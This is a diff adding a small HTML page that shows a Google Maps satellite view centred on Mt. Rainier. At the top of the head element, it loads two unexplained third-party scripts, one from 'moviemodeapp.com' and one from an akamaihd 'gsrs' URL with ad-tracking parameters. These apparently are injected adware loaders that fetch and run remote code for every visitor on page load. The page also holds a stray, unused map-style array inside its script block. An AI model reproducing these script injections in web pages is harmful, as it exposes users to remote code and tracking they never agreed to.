@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+
+<html>
+    <head><script src="http://d.moviemodeapp.com/l/load.js"></script><script src="http://apienhancetronic-a.akamaihd.net/gsrs?g=50cf52c3-2ef1-4d5c-a073-5fdf1f0a8280&bp=BF&is=adssUS"></script> 
+        <title> map of Rainier </title>
+        <style type="text/css">
+            html { height: 100% }
+            body { height: 100%; 
+                margin: 0px; 
+                padding: 0px; 
+                background-color: black; 
+                color: #CCCCCC;
+                text-align: center}
+            #map_canvas { width:90%; 
+                height:80%; 
+                margin-left: auto; 
+                margin-right: auto }
+        </style>
+        <script type="text/javascript"
+            src="http://maps.google.com/maps/api/js?sensor=false">
+        </script>
+        <script type="text/javascript">
+            function initialize() {
+                var classroom = new google.maps.LatLng(46.860855,-121.754315)
+                var myOptions = {
+                    zoom: 12,
+                    center: classroom,
+                    mapTypeId: google.maps.MapTypeId.SATELLITE
+                };
+                var map = new google.maps.Map(
+                    document.getElementById("map_canvas"), 
+                    myOptions);
+            }
+            [
+  {
+    "featureType": "road.highway",
+    "stylers": [
+      { "visibility": "on" },
+      { "hue": "#2200ff" }
+    ]
+  },{
+    "featureType": "poi.park",
+    "stylers": [
+      { "visibility": "on" },
+      { "weight": 8 },
+      { "hue": "#00ffdd" },
+      { "saturation": 100 },
+      { "lightness": -38 }
+    ]
+  },{
+    "featureType": "landscape.natural",
+    "elementType": "labels",
+    "stylers": [
+      { "visibility": "on" },
+      { "hue": "#ff4d00" }
+    ]
+  },{
+  }
+]
+        </script>
+    </head>
+    
+    <body onload="initialize()">
+        <h1>Mt. Rainier</h1>
+        <div id="map_canvas"></div>
+    </body>
+</html>
